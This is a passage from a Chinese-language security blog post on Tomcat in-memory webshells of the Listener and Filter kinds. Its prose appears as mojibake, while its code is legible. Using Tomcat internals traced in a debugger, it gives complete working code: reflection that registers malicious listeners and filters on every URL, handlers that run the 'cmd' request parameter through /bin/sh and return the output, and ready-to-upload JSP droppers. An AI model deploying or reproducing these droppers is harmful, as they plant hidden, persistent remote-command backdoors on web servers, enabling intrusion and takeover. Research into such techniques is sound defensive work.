ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦å»çœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ€æ ·æ‰èƒ½é€šè¿‡åå°„â€å¤Ÿåˆ°â€StandardContextçš„addApplicationEventListeneræ–¹æ³•ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626160137366.png" alt="image-20210626160137366"></p><p>å¯ä»¥ç›´è§‚çš„çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡servletContextè·å¾—å®ƒçš„contextå±æ€§ï¼ˆApplicationContextå¯¹è±¡ï¼‰ï¼Œç„¶åé€šè¿‡ApplicationContextå¯¹è±¡çš„contextè·å¾—StandardContextå¯¹è±¡ï¼Œç„¶åè°ƒç”¨addApplicationEventListeneræ–¹æ³•ã€‚å¾ˆå¥½ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åå°„ä»£ç </span><br><span class="line">            ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">            Field field &#x3D; servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(servletContext);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            standardContext.addApplicationEventListener(new MyListener(request,response)); &#x2F;&#x2F;è¿™ä¸€è¡Œæ˜¯å°†æŸä¸ªListenerç±»æ·»åŠ åˆ°ç›‘å¬å™¨</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ¶æ„Listener</span><br><span class="line">public class MyListenr implements ServletRequestListener &#123;</span><br><span class="line"></span><br><span class="line">    public ServletResponse response;</span><br><span class="line">    public ServletRequest request;</span><br><span class="line"></span><br><span class="line">    MyListenr(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">        this.request &#x3D; request;</span><br><span class="line">        this.response &#x3D; response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            this.response.getWriter().write(result);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®éªŒä¸€ä¸‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162713503.png" alt="image-20210626162713503"></p><p>æˆ‘ä»¬å…ˆè®¿é—®/aè·¯ç”±ï¼Œè®©ä»£ç è¢«æ‰§è¡Œã€‚ç„¶ååˆ°ä»»æ„é¡µé¢ä¼ å…¥æ¶æ„å‚æ•°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162750746.png" alt="image-20210626162750746"></p><p>SUCCESSã€‚</p><p>ä¸ºäº†æ›´æ–¹ä¾¿çš„æ³¨å…¥å†…å­˜é©¬ï¼Œæˆ‘ä»ç½‘ä¸Šå«–äº†ä¸€ä¸ªJSPï¼ˆLinuxç‰ˆï¼‰ã€‚åªè¦æˆ‘ä»¬ä¸Šä¼ è¯¥JSPç„¶åè®¿é—®å®ƒä¸€ä¸‹ï¼Œå†…å­˜é©¬å°±è¢«æ³¨å…¥äº†ï¼Œååˆ†çš„æ–¹ä¾¿ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.jasper.tagplugins.jstl.core.Out&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;javax.servlet.annotation.WebServlet&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">     ListenH listenH &#x3D; new ListenH(request, response);</span><br><span class="line">    standardContext.addApplicationEventListener(listenH);</span><br><span class="line">    out.print(&quot;test&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    public class ListenH implements ServletRequestListener &#123;</span><br><span class="line">        public ServletResponse response;</span><br><span class="line">        public ServletRequest request;</span><br><span class="line"></span><br><span class="line">        ListenH(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">            this.request &#x3D; request;</span><br><span class="line">            this.response &#x3D; response;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">            String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                String line;</span><br><span class="line">                while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦</span><br><span class="line">                    sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                String result &#x3D; sb.toString();</span><br><span class="line">                this.response.getWriter().write(result);</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                System.out.println(&quot;error &quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Filter-å†…å­˜é©¬"><a href="#Filter-å†…å­˜é©¬" class="headerlink" title="Filter å†…å­˜é©¬"></a>Filter å†…å­˜é©¬</h2><p>Filterå†…å­˜é©¬ä¸Listenerå†…å­˜é©¬è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„ï¼Œè¦å¤æ‚ä¸€ç‚¹ç‚¹</p><h3 id="doFilteræ–¹æ³•å¦‚ä½•è¢«æ‰§è¡Œï¼Ÿ"><a href="#doFilteræ–¹æ³•å¦‚ä½•è¢«æ‰§è¡Œï¼Ÿ" class="headerlink" title="doFilteræ–¹æ³•å¦‚ä½•è¢«æ‰§è¡Œï¼Ÿ"></a>doFilteræ–¹æ³•å¦‚ä½•è¢«æ‰§è¡Œï¼Ÿ</h3><h4 id="é…ç½®filter"><a href="#é…ç½®filter" class="headerlink" title="é…ç½®filter"></a>é…ç½®filter</h4><p>å†å¼€å§‹åˆ†æFilterå†…å­˜é©¬æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å…ˆçŸ¥é“ï¼ŒFilterç±»ä¸­çš„doFilteræ–¹æ³•æ˜¯å¦‚ä½•è¢«æ‰§è¡Œçš„ã€‚</p><p>OKæˆ‘ä»¬å…ˆåˆ›å»ºå¥½ä¸€ä¸ªFilterã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Filterç±»ä»£ç </span><br><span class="line">public class MyFilter implements ServletRequestListener &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Filter!&quot;);</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åœ¨web.xmlä¸­æ·»åŠ Filterã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626193215688.png" alt="image-20210626193215688"></p><p>æˆ‘ä»¬åœ¨doFilteræ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œï¼Œå¾—åˆ°è°ƒç”¨å¸§å¦‚ä¸‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204005990.png" alt="image-20210626204005990"></p><h4 id="filterchain"><a href="#filterchain" class="headerlink" title="filterchain"></a>filterchain</h4><p>æˆ‘ä»¬ä»StandardWrapperValue#invoke å¤„å¼€å§‹åˆ†æ.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªfilterChainæ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204524626.png" alt="image-20210626204524626"></p><p>å†åº¦è·Ÿè¿›åˆ°createFilterChainæ–¹æ³•ï¼Œæ¥åˆ°äº†ApplicationFilterFactory.javaé‡Œã€‚</p><p>æ¯”è¾ƒå…³é”®çš„ä»£ç æ˜¯è¿™é‡Œã€‚è¿™ä¸ªæ–¹æ³•ä¼šéå†FilterMapsï¼Œæ£€æµ‹æ¯ä¸ªFilterMapé¡¹å¯¹åº”çš„é‚£ä¸ªFilterä¸è¯·æ±‚çš„è·¯ç”±ç­‰æ˜¯å¦ä¸€è‡´ã€‚è‹¥ä¸€è‡´åˆ™å°†ä»¥è¯¥filterçš„nameä¸ºå‚æ•°å»FilterConfigsé‡Œå»å¯»æ‰¾å¯¹åº”çš„FilterConfig,ç„¶åå°†è¯¥filterconfigæ”¾å…¥filterchainä¸­ã€‚ä¸ä¸€è‡´çš„åˆ™æŠ›å¼ƒã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204752458.png" alt="image-20210626204752458"></p><h4 id="filterconfigä¸filterdef"><a href="#filterconfigä¸filterdef" class="headerlink" title="filterconfigä¸filterdef"></a>filterconfigä¸filterdef</h4><p>é‚£ä¹ˆfilterconfigåˆæ˜¯ä¸ªä»€ä¹ˆæ ·çš„ä¸œè¥¿å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬è·Ÿè¿›context.findFilterConfig,è¿™é‡Œçš„contextæ˜¯StandardContextã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205344727.png" alt="image-20210626205344727"></p><p>å†åº¦è·Ÿè¿›filterconfigsï¼Œå°±å¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°filterconfigsæ˜¯ä¸€ä¸ªhashmapç»“æ„ é”®ä¸ºfilteråï¼Œå€¼ä¸ºfilterconfig<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205418654.png" alt="image-20210626205418654"></p><p>é‚£ä¹ˆfilterconfigçš„ç»“æ„åˆæ˜¯å¦‚ä½•ã€‚æˆ‘ä»¬è·Ÿè¿›ApplicationFilterConfigç±»ã€‚ä¸‹å›¾æ˜¯æ­¤ç±»çš„æ„é€ å‡½æ•°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205854332.png" alt="image-20210626205854332"></p><p>å…³é”®åœ°æ–¹åœˆå‡ºæ¥äº†æ˜¯ä¸filterdefæœ‰å…³çš„ä»£ç ã€‚åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™å°†ä¼ å…¥contextå’Œfilterdefï¼Œç„¶åå†é€šè¿‡å¯¹filterdefè°ƒç”¨getfilterè·å¾—filterç±»ï¼ˆå³æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„filterç±»ï¼‰ã€‚<br> æˆ‘ä»¬å†çœ‹çœ‹filterDefçš„å…³é”®ä»£ç </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210144048.png" alt="image-20210626210144048"><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210116555.png" alt="image-20210626210116555"></p><p>OKOKï¼Œä¸Šé¢å°±æ˜¯FilterConfigï¼ŒFilterChainå’ŒFilterDefçš„ä¸€äº›é›¶ç¢çš„ä»‹ç»ã€‚<br>æˆ‘ä»¬å¤§è‡´å¯ä»¥å¾—åˆ°ä¸‹åˆ—å…³é”®ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FilterConfigs æ˜¯ä¸€ä¸ªHashMapç»“æ„ï¼Œé”®ä¸ºfilteråï¼Œå€¼ä¸ºfilterconfig</span><br><span class="line">filterconfigåŒ…å«äº†filterdef</span><br><span class="line">filterdefç›´æ¥ä¸filterç±»ç›¸å…³è”</span><br></pre></td></tr></table></figure><p>StandardWrapperValue#invoke è¿™ä¸€å±‚åˆ†æå®Œäº†ï¼Œè¿™ä¸€å±‚æ˜¯æœ€éº»çƒ¦çš„ï¼Œå‘ä¸‹ä¸¤å±‚å°†ä¼šäº²åˆ‡å¾ˆå¤šã€‚</p><h4 id="ä¸‹é¢çš„ä¸¤å±‚"><a href="#ä¸‹é¢çš„ä¸¤å±‚" class="headerlink" title="ä¸‹é¢çš„ä¸¤å±‚"></a>ä¸‹é¢çš„ä¸¤å±‚</h4><p>å‘ä¸‹åˆ†ææ¥åˆ°ApplicationFilterChain#doFilter.è¿™ä¸€å±‚å¾ˆç®€å•ï¼Œè°ƒäº†ä¸ªinternalDofilterå°±æ²¡äº†<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210643466.png" alt="image-20210626210643466"></p><p>å†å‘ä¸‹åˆ†ææ¥åˆ°ApplicationFilterChain#internalDoFilterã€‚<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210808889.png" alt="image-20210626210808889"></p><p>å…³é”®çš„åœ°æ–¹åœˆå‡ºæ¥äº†ï¼Œå¤§è‡´å°±æ˜¯é€šè¿‡filterchainé‡Œçš„filterconfigçš„getFilteræ–¹æ³•ï¼ˆä¸‹å›¾ä¸ºgetFilteræ–¹æ³•ï¼Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°æ˜¯è¿”å›äº†filterï¼‰ä»è€Œè·å¾—filterdefé‡Œçš„filterï¼Œä»è€Œè°ƒç”¨filterçš„dofilterï¼Œè¿™å°±æ˜¯å¤§æ¦‚çš„æµç¨‹ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627113023603.png" alt="image-20210627113023603"></p><h4 id="åŠ è½½è¿‡ç¨‹æµç¨‹å›¾"><a href="#åŠ è½½è¿‡ç¨‹æµç¨‹å›¾" class="headerlink" title="åŠ è½½è¿‡ç¨‹æµç¨‹å›¾"></a>åŠ è½½è¿‡ç¨‹æµç¨‹å›¾</h4><p>æ–‡å­—æ€»æ˜¯æœ‰äº›è´«ç˜ çš„ï¼Œç”¨å›¾æ¥è¯´è¯å°±ä¼šæ˜äº†è®¸å¤šã€‚<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627115155496.png" alt="image-20210627115155496"></p><h3 id="FilterDefæ·»åŠ "><a href="#FilterDefæ·»åŠ " class="headerlink" title="FilterDefæ·»åŠ "></a>FilterDefæ·»åŠ </h3><p>æˆ‘ä»¬å¦‚ä½•æŠŠFilterDefä¸æˆ‘ä»¬çš„Filterå…³è”èµ·æ¥å¹¶æ·»åŠ åˆ°standardContextä¸­å‘¢ï¼Ÿè¿™ä¸ªé—®é¢˜æ¯”è¾ƒå…³é”®ï¼Œå› ä¸ºæˆ‘ä»¬å¿…é¡»å°†æˆ‘ä»¬çš„FilterDefæ³¨å…¥åˆ°å†…å­˜æ‰èƒ½è®©æˆ‘ä»¬çš„Filteræœ‰è¢«è°ƒç”¨çš„å¯èƒ½æ€§ã€‚</p><p>å®é™…ä¸Šå‘¢ï¼Œä¹Ÿå¾ˆç®€å•ã€‚æµç¨‹ä¸Šæ¥è¯´ä¸Listenerå†…å­˜é©¬å·®ä¸å¤š</p><p>æ‰“æ–­ç‚¹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122501784.png" alt="image-20210627122501784"></p><p>è·Ÿè¿›<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122632548.png" alt="image-20210627122632548"></p><p>å†è·Ÿ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122645331.png" alt="image-20210627122645331"></p><p>ç»§ç»­è·Ÿ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122745165.png" alt="image-20210627122745165"></p><p>æ¥åˆ°æ­¤å¤„ï¼Œä¸Listenerå†…å­˜é©¬ç¥ä¼¼ã€‚<br>ifåˆ¤æ–­é‡Œåˆ¤æ–­äº†ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ<br>contextæ˜¯standardContextï¼Œè¿™é‡Œè°ƒç”¨äº†å®ƒçš„addFilterDefæ¥æ·»åŠ FilterDefã€‚</p><h3 id="ç¼–å†™Filterå†…å­˜é©¬"><a href="#ç¼–å†™Filterå†…å­˜é©¬" class="headerlink" title="ç¼–å†™Filterå†…å­˜é©¬"></a>ç¼–å†™Filterå†…å­˜é©¬</h3><p>æ—¢ç„¶æµç¨‹å·²ç»æ˜ç™½äº†ï¼Œé‚£å†™èµ·æ¥å°±ä¸éš¾äº†.<br>è‡³äºä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼ŒåŸå› å’ŒListeneræ˜¯ä¸€æ ·çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åå°„ä»£ç </span><br><span class="line">try &#123;</span><br><span class="line">            response.getWriter().write(&quot;a&quot;);</span><br><span class="line">            System.out.println(&quot;Servlet Get Message\n&quot;);</span><br><span class="line">            Object obj &#x3D; request.getServletContext();</span><br><span class="line">            Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            &#x2F;&#x2F;è·å–standardContext</span><br><span class="line"></span><br><span class="line">            FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">            filterDef.setFilter(new MyFilter());</span><br><span class="line">            filterDef.setFilterName(&quot;MyFilter&quot;);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            &#x2F;&#x2F;å°†FilterDefä¸filterå…³è”ï¼Œæ³¨å…¥åˆ°å†…å­˜</span><br><span class="line"></span><br><span class="line">            field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            HashMap filterConfigs &#x3D; (HashMap) field.get(standardContext);&#x2F;&#x2F;è·å–filterConfigs</span><br><span class="line">            Constructor constructor &#x3D;</span><br><span class="line">                    Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).</span><br><span class="line">                            getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            filterConfigs.put(&quot;MyFilter&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line">            &#x2F;&#x2F;å°†åŒ…å«filterDefçš„filterConfigæ·»åŠ åˆ°filterConfigs</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">            filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">            filterMap.setFilterName(&quot;MyFilter&quot;);</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">            &#x2F;&#x2F;å°†è¯¥filterMapä¸filterConfigè¿›è¡ŒNAMEç»‘å®šå¹¶æ”¾åˆ°filterMapsçš„é¦–ä½</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æœ¨é©¬æœ¬ä½“</span><br><span class="line">public class MyFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            resp.getWriter().write(result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šå«–çš„JSP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.HashMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line"></span><br><span class="line">     FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">     filterDef.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterDef(filterDef);  &#x2F;&#x2F; åœ¨contextä¸­æ·»åŠ filterMapæ—¶ä¼šå»æ‰¾ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯¹åº”çš„filterdef</span><br><span class="line">     Filter filter &#x3D; new testF();</span><br><span class="line">     filterDef.setFilter(filter); &#x2F;&#x2F; å°†æˆ‘ä»¬åˆ›å»ºçš„filterä¸filterdefç›¸å…³è”èµ·æ¥</span><br><span class="line"></span><br><span class="line">     field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     HashMap hashMap &#x3D;  (HashMap) field.get(standardContext);</span><br><span class="line">     Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">     constructor.setAccessible(true);</span><br><span class="line">     hashMap.put(&quot;testF&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line"></span><br><span class="line">     FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">     filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">     filterMap.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">     System.out.println(&quot;filter ok !&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">     public class testF implements Filter &#123;</span><br><span class="line">          public void destroy() &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">               String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">               String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">               try &#123;</span><br><span class="line">                    Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                    StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                         &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦</span><br><span class="line">                         sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    String result &#x3D; sb.toString();</span><br><span class="line">                    resp.getWriter().write(result);</span><br><span class="line">               &#125;catch (Exception e)&#123;</span><br><span class="line">                    System.out.println(&quot;error &quot;);</span><br><span class="line">               &#125;</span><br><span class="line">               chain.doFilter(req,resp);</span><br><span class="line">          &#125;</span><br><span class="line">          public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122022432.png" alt="image-20210627122022432"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä¸ªäººæ„Ÿè§‰è¿™ç¯‡æ–‡ç« 